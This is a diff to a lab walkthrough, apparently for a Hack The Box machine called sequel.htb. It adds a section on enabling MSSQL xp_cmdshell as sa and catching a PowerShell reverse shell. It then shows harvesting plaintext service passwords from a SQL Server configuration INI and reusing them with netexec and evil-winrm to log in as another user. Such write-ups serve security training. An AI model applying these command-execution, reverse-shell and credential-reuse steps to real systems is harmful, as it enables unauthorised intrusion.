@@ -434,7 +434,7 @@ SQL (sa  dbo@master)>
 
 At this point, there is an interesting feature in `MSSQL` servers called `xp_cmdshell`.
 
-It can allow us to run commands into the system.
+It allows us to run commands on the system.
 
 However, if we try to run a command:
 
@@ -449,7 +449,7 @@ SQL (sa  dbo@master)> xp_cmdshell whoami
 
 Error! The `xp_cmdshell` utility is disabled.
 
-But since we're authenticated as `sa`, we can easily enabled it:
+But since we're authenticated as `sa`, we can easily enable it:
 
 <br />
 
@@ -480,11 +480,11 @@ Commands run under the context of the `sql_svc` user.
 
 <br />
 
-### reverse.ps1:
+### Uploading a PowerShell Reverse Shell:
 
 <br />
 
-We're running commands on the system, it's time to gain an interactive shell.
+Now that we can run commands in the system, it's time to gain an interactive shell.
 
 One straightforward approach is to upload a `reverse.ps1` payload:
 
@@ -529,6 +529,203 @@ connect to [10.10.14.12] from (UNKNOWN) [10.10.11.51] 49482
 whoami
 sequel\sql_svc
 PS C:\Windows\system32> 
+```
+
+<br />
+
+# Privilege Escalation: sql_svc -> ryan
+
+<br />
+
+There is nothing more than our `reverse.ps1` in the `sql_svc` home directory:
+
+<br />
+
+```bash
+PS C:\Users\sql_svc\Desktop> dir
+
+
+    Directory: C:\Users\sql_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        6/14/2025  10:10 AM            623 reverse.ps1   
+```
+
+<br />
+
+And he doesn't have any interesting privilege:
+
+<br />
+
+```bash
+PS C:\Users\sql_svc\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+<br />
+
+While enumerating the system, we find an uncommon folder in the root of the system, `SQL2019`:
+
+<br />
+
+```bash
+PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        11/5/2022  12:03 PM                PerfLogs                                                              
+d-r---         1/4/2025   7:11 AM                Program Files                                                         
+d-----         6/9/2024   8:37 AM                Program Files (x86)                                                   
+d-----         6/8/2024   3:07 PM                SQL2019                                                               
+d-r---         6/9/2024   6:42 AM                Users                                                                 
+d-----         1/4/2025   8:10 AM                Windows                                                               
+
+```
+
+<br />
+
+Inside, there is another folder called `ExpressAdv_ENU`:
+
+<br />
+
+```bash
+PS C:\SQL2019> dir
+
+
+    Directory: C:\SQL2019
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         1/3/2025   7:29 AM                ExpressAdv_ENU
+```
+
+<br />
+
+This folder contains several files and subdirectories:
+
+<br />
+
+```bash
+PS C:\SQL2019\ExpressAdv_ENU> dir
+
+
+    Directory: C:\SQL2019\ExpressAdv_ENU
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                           
+d-----         6/8/2024   3:07 PM                redist                                                                
+d-----         6/8/2024   3:07 PM                resources                                                             
+d-----         6/8/2024   3:07 PM                x64                                                                   
+-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                           
+-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         
+-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                         
+-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                             
+-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      
+-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 
+-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL
+```
+
+<br />
+
+### sql-Configuration.INI:
+
+<br />
+
+In the `sql-Configuration.INI` file, we find some credentials:
+
+<br />
+
+```bash
+PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+```
+
+<br />
+
+In the `C:\Users` directory we can see another user called `ryan`.
+
+The credentials work for him:
+
+<br />
+
+```bash
+❯ netexec winrm sequel.htb -u "ryan" -p "WqSZAF6CysDQbGb3"
+WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
+```
+
+<br />
+
+We use `evil-winrm` to gain an interactive shell as this user:
+
+<br />
+
+```bash
+❯ evil-winrm -i sequel.htb -u "ryan" -p "WqSZAF6CysDQbGb3"
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
+sequel\ryan
+```
+
+<br />
+
+And we get the `user.txt` flag:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
+516de9ed6f058aa7a03aa22195xxxxxx
 ```
 
 <br />
